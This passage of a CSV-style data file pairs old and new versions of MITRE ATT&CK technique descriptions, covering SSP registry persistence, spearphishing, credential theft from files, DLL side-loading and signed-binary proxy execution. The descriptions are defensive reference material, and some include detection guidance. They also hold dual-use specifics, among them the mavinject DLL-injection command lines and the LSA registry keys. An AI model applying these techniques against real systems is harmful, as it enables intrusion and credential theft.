In AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)","Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.  

IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources)

Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022)

In AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS re Inforce Trust Mod)"
A021,T1101,2.0,3.0,Security Support Provider,Security Support Provider,"Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.
 (Citation: Graeber 2014)

Detection: Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)

Platforms: Windows

Data Sources: DLL monitoring, Windows Registry, Loaded DLLs

Permissions Required: Administrator","Windows Security Support Provider (SSP) DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.
 (Citation: Graeber 2014)"
A022,T1025,6.0,7.0,Data from Removable Media,Data from Removable Media,"Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.

Adversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.","Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. 

Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media."
A023,T1566.002,17.0,18.0,Spearphishing Link,Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.

Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)

Adversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through “consent phishing” into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)

Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)","Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.

Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also utilize links to perform consent phishing/spearphishing campaigns to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured into granting adversaries permissions/access via a malicious OAuth 2.0 request URL that when accepted by the user provide permissions/access for malicious applications.(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)

Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)"
A024,T1136,5.0,6.0,Create Account,Create Account,"Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

The <code>net user</code> commands can be used to create a local or domain account.","Adversaries with a sufficient level of access may create a local system, domain, or cloud tenant account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.

### Windows

The <code>net user</code> commands can be used to create a local or domain account.

### Office 365

An adversary with access to a Global Admin account can create another account and assign it the Global Admin role for persistent access to the Office 365 tenant.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)"
A025,T1552.001,14.0,15.0,Credentials In Files,Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)","Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)"
A026,T1119,2.0,3.0,Automated Collection,Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of Scripting to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as File and Directory Discovery and Remote File Copy to identify and move files.

Detection: Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as Data Staged. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.

Platforms: Linux, macOS, Windows

Data Sources: File monitoring, Process command-line parameters, Data loss prevention

Permissions Required: User

System Requirements: Permissions to access directories and files that store information of interest.","Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File Copy](https://attack.mitre.org/techniques/T1105) to identify and move files."
A027,T1200,2.0,3.0,Hardware Additions,Hardware Additions,"Computer accessories, computers or networking hardware may be introduced into a system as a vector to gain execution. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.

Detection: Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. 

Endpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.

Platforms: Linux, Windows, macOS

Data Sources: Asset Management, Data loss prevention","Computer accessories, computers, or networking hardware may be introduced into a system as a vector to gain execution. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others."
A028,T1584.004,12.0,13.0,Server,Server,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.

Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).","Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.

Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations."
A029,T1218.009,10.0,11.0,Regsvcs/Regasm,Regsvcs/Regasm,"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)","Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)"
A030,T1018,6.0,7.0,Remote System Discovery,Remote System Discovery,"Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. Adversaries may also use local host files in order to discover the hostname to IP address mappings of remote systems. 

### Windows

Examples of tools and commands that acquire this information include ""ping"" or ""net view"" using [Net](https://attack.mitre.org/software/S0039). The contents of the <code>C:\Windows\System32\Drivers\etc\hosts</code> file can be viewed to gain insight into the existing hostname to IP mappings on the system.

### Mac

Specific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as ""ping"" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.

### Linux

Utilities such as ""ping"" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.

### Cloud

In cloud environments, the above techniques may be used to discover remote systems depending upon the host operating system. In addition, cloud environments often provide APIs with information about remote systems and services.
","Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097) or <code>net view</code> using [Net](https://attack.mitre.org/software/S0039). Adversaries may also use local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) in order to discover the hostname to IP address mappings of remote systems. 

Specific to macOS, the <code>bonjour</code> protocol exists to discover additional Mac-based systems within the same broadcast domain.

Within IaaS (Infrastructure as a Service) environments, remote systems include instances and virtual machines in various states, including the running or stopped state. Cloud providers have created methods to serve information about remote systems, such as APIs and CLIs. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API and a <code>describe-instances</code> command within the AWS CLI that can return information about all instances within an account.(Citation: Amazon Describe Instances API)(Citation: Amazon Describe Instances CLI) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project, and Azure's CLI <code>az vm list</code> lists details of virtual machines.(Citation: Google Compute Instances)(Citation: Azure VM List)"
A031,T1574.002,8.0,9.0,DLL Side-Loading,DLL Side-Loading,"Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.

Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: About Side by Side Assemblies) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  (Citation: FireEye DLL Side-Loading)

Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.","Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).

Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)"
A032,T1218,2.0,3.0,Signed Binary Proxy Execution,Signed Binary Proxy Execution,"Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

===Mavinject.exe===
Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

<code>""C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe"" <PID> /INJECTRUNNING <PATH DLL>
C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL></code>

===SyncAppvPublishingServer.exe===
SyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

Several others binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)

Detection: Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.

Platforms: Windows

Data Sources: Process monitoring, Process command-line parameters

Defense Bypassed: Application whitelisting, Digital Certificate Validation

Permissions Required: User

Remote Support: No

Contributors: Praetorian","Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.

### Mavinject.exe
Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)

<code>""C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe"" <PID> /INJECTRUNNING <PATH DLL></code>
<code>C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL></code>

### SyncAppvPublishingServer.exe
SyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)

Several others binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)"
A033,T1124,8.0,9.0,System Time Discovery,System Time Discovery,"An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)

System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting.","An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)

System time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>. (Citation: Technet Windows Time Service)

This information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)"
A034,T1016,6.0,7.0,System Network Configuration Discovery,System Network Configuration Discovery,"Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
A035,T1008,2.0,3.0,Fallback Channels,Fallback Channels,"Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Malware reverse engineering, Process use of network, Process monitoring

Requires Network: Yes",Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.
A036,T1566.003,14.0,15.0,Spearphishing via Service,Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working."
A037,T1539,6.0,7.0,Steal Web Session Cookie,Steal Web Session Cookie,"An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Mauraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding web application.","An adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.

Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)

There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) There are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1506) technique to login to the corresponding web application."
A038,T1086,2.0,3.0,PowerShell,PowerShell,"PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including Empire, (Citation: Github PowerShell Empire) PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

Detection: If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution. (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features. (Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

Platforms: Windows

Data Sources: Windows Registry, File monitoring, Process command-line parameters, Process monitoring

Permissions Required: User, Administrator

Remote Support: Yes","PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

